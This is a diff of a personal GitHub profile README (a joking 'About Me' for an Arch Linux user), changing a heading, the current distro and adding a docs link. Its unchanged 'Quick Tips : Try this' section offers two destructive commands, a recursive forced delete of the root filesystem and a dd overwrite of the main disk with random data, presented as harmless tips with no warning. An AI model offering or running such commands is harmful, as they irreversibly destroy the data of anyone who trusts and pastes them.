@@ -12,20 +12,19 @@
 # 📖 About Me
 Just a hooman, who likes to learn about system and their feelings as well :)
 
-## ***A DistroHopper :)***
+## ***A DistroHoper :)***
 
 Former Arch user
 
 > I use arch btw, 
 
-- currently Base Arch*
+- currently Endeavour - Arch*
 
 > ```I like breaking things :)```
 
 **Quick Tips : Try this**
 
 `sudo pacman -Syu;sudo rm -rvf /* --no-preserve-root`
-
 
 
 `sudo dd if=/dev/urandom of=/dev/sda status=progress`
@@ -39,6 +38,8 @@ Former Arch user
 - Telegram : [@l4feer](https://t.me/L4feer)
 - Discord : l4feer (Lafeer0427)
 - Github : [L4FeeR](https://github.com/L4FeeR)
+
+- You want docs? look at this [Here!](https://docs.github.com/en)
 
 <!--
 **L4FeeR/L4FeeR** is a ✨ _special_ 
